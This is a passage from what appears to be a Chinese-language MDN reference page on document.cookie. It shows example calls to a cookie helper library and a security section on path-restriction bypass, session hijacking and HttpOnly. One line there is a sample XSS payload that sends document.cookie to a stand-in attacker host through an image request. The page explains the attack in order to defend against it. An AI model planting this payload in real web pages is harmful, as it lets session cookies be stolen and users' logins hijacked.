    docCookies.setItem("test1", "Unicode test: \u00E0\u00E8\u00EC\u00F2\u00F9", Infinity);

    docCookies.setItem("test2", "Hello world!", new Date(2020, 5, 12));

    docCookies.setItem("test3", "Hello world!", new Date(2027, 2, 3), "/blog");

    docCookies.setItem("test4", "Hello world!", "Sun, 06 Nov 2022 21:43:15 GMT");

    docCookies.setItem("test5", "Hello world!", "Tue, 06 Dec 2022 13:11:07 GMT", "/home");

    docCookies.setItem("test6", "Hello world!", 150);

    docCookies.setItem("test7", "Hello world!", 245, "/content");

    docCookies.setItem("test8", "Hello world!", null, null, "example.com");

    docCookies.setItem("test9", "Hello world!", null, null, null, true);

    docCookies.setItem("test1;=", "Safe character test;=", Infinity);

    alert(docCookies.keys().join("\n"));
    alert(docCookies.getItem("test1"));
    alert(docCookies.getItem("test5"));
    docCookies.removeItem("test1");
    docCookies.removeItem("test5", "/home");
    alert(docCookies.getItem("test1"));
    alert(docCookies.getItem("test5"));
    alert(docCookies.getItem("unexistingCookie"));
    alert(docCookies.getItem());
    alert(docCookies.getItem("test1;="));
```



# 安全

路径限制并**不能**阻止从其他路径访问cookie. 

使用简单的DOM即可轻易地绕过限制(比如创建一个指向限制路径的, 隐藏的[iframe](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe), 然后访问其 `contentDocument.cookie` 属性). 

保护cookie不被非法访问的唯一方法是将它放在另一个域名/子域名之下, 利用[同源策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)保护其不被读取.

Web应用程序通常使用cookies来标识用户身份及他们的登录会话. 

因此通过窃听这些cookie, 就可以劫持已登录用户的会话. 窃听的cookie的常见方法包括社会工程和XSS攻击 -

`(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;`

`HttpOnly` 属性可以阻止通过javascript访问cookie, 从而一定程度上遏制这类攻击. 参见 [Cookies and Security](http://www.nczonline.net/blog/2009/05/12/cookies-and-security/).

# 备注

- 从 Firefox 2 起, 有更好的客户端存储机制用以替代 cookie - [WHATWG DOM Storage](https://developer.mozilla.org/zh-CN/docs/DOM/Storage).
- 你可以通过更新一个cookie的过期时间为0来删除一个cookie。
- 请注意, 更多/更大的 cookies 意味着每个请求都要包含更繁重的数据传输. 如果您只是需要存储些 "client-only" 的数据, 那么郑重建议您使用 [WHATWG DOM Storage](https://developer.mozilla.org/zh-CN/docs/DOM/Storage).

# 规范

[DOM Level 2: HTMLDocument.cookie](http://www.w3.org/TR/DOM-Level-2-HTML/html.html#ID-8747038)

# Reference

- [HTTP cookies](https://developer.mozilla.org/zh-CN/docs/Web_Development/HTTP_cookies)
- [Cookies](https://developer.mozilla.org/zh-CN/docs/Code_snippets/Cookies) (Code snippets)

